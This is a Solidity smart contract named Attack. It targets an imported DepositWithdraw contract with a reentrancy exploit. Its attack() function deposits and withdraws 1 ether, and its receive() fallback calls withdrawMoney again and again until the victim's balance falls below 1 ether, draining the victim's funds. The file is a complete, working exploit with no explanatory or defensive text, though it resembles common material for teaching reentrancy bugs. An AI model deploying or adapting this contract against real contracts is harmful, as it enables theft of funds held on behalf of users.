pragma solidity ^0.8.0;
//SPDX-License-Identifier: MIT

import "./DepositWithdraw.sol";

contract Attack{
    DepositWithdraw public depositWithdraw;



    constructor(address _contractAddress){
        depositWithdraw = DepositWithdraw(_contractAddress);
    }

    receive() external payable{
        if(address(depositWithdraw).balance >= 1 ether)
        {
            depositWithdraw.withdrawMoney(1 ether);
        }
    }

    function attack() public payable{
        require(msg.value >= 1 ether);
        depositWithdraw.deposit{value:1 ether}();
        depositWithdraw.withdrawMoney(1 ether);

    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}